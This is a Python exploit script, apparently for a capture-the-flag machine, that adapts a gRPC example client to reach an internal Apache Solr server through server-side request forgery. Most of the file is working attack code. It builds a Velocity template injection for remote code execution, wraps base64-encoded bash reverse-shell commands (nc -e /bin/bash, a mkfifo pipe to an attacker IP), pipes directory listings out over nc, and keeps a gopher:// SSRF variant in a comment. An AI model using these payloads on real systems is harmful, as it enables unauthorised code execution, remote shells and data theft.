# Copyright 2015 gRPC authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The Python implementation of the GRPC helloworld.Greeter client."""

from __future__ import print_function
import logging

import grpc
import requests
import base64
import s_pb2
import s_pb2_grpc
import json
import pickle
import urllib

rind = 2

def make_payload(payload):
    print("--------------------------------------------------------------------------------")
    global rind
    #p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'", "id":"'+ str(rind) + '"}'
    #p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'
    p = '{"home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'

    # For storing 
    p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
    p = base64.b64encode(p)
    #p = base64.urlsafe_b64encode(p)
    return p 

def run(t):
    # NOTE(gRPC Python Team): .close() is possible on a channel and should be
    # used in circumstances in which the with statement does not fit the needs
    # of the code.
    #channel = grpc.insecure_channel('laser.htb:9000')
    with grpc.insecure_channel('laser.htb:9000') as channel:
        stub = s_pb2_grpc.PrintStub(channel)

        d = s_pb2.Content(
                data = t,
                )

        response = stub.Feed(d)

    #print(response)
    #print("Greeter client received: " + response.feed)


if __name__ == '__main__':
    '''
    GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('nc 10.10.14.19 1337')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1
    Host: localhost:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded
    Cache: no-cache
    Connection: close
    '''


    ###########################################################################
    # rce
    ###########################################################################
    port = "1999"
    '''
    command = "nc -e /bin/bash 10.10.14.19 1337"
    command = "nc 10.10.14.19 1337 -e /bin/bash"
    command = "nc 10.10.14.19 1337"
    '''
    #full encode
    command = "nc 10.10.14.5 " + port
    command = "ls -al /tmp | nc 10.10.14.5 "+port
    command = "rm /tmp/"+port+";mkfifo /tmp/"+port+";cat /tmp/"+port+"|/bin/bash -i 2>&1|nc 10.10.14.5 "+port+" >/tmp/"+port
    #cmd = 'bash -c {echo,' + base64.b64encode(command.encode('utf-8')).decode('utf-8') + '}|{base64,-d}|{bash,-i}'
    # bytes > base64 > string
    cmd = 'bash -c {echo,' + base64.b64encode(command.encode('utf-8')).decode('utf-8') + '}|{base64,-d}|{bash,-i}'
    old = cmd
    cmd = cmd.replace('+', '%2b')
    c = urllib.parse.quote(cmd)
    url = ("/select?q=1&wt=velocity&v.template=custom&v.template.custom="
        "%23set($x=%27%27)+"
        "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
        "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
        "%23set($str=$x.class.forName(%27java.lang.String%27))+"
        "%23set($ex=$rt.getRuntime().exec(%27" + c +
        "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
        "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")

    payload = "http://localhost:8983/solr/staging" + url
    '''
    payload = "gopher://localhost:8983/_GET%2520%252Fsolr%252Fstaging%252Fselect%253Fq%253D1%2526wt%253Dvelocity%2526v.template%253Dcustom%2526v.template.custom%253D%2523set(%2524x%253D%2527%2527)%2520%2523set(%2524rt%253D%2524x.class.forName(%2527java.lang.Runtime%2527))%2520%2523set(%2524chr%253D%2524x.class.forName(%2527java.lang.Character%2527))%2520%2523set(%2524str%253D%2524x.class.forName(%2527java.lang.String%2527))%2520%2523set(%2524ex%253D%2524rt.getRuntime().exec(%2527nc%252010.10.14.19%25201337%2527))%2520%2524ex.waitFor()%2520%2523set(%2524out%253D%2524ex.getInputStream())%2520%2523foreach(%2524i%2520in%2520%255B1..%2524out.available()%255D)%2524str.valueOf(%2524chr.toChars(%2524out.read()))%2523end%2520HTTP%252F1.1%250AHost%253A%2520localhost%253A8983%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A69.0)%2520Gecko%252F20100101%2520Firefox%252F69.0%250AAccept%253A%2520*%252F*%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250ACache%253A%2520no-cache%250AConnection%253A%2520close%250A%250A"
    '''

    temp = make_payload(payload)
    run(temp)
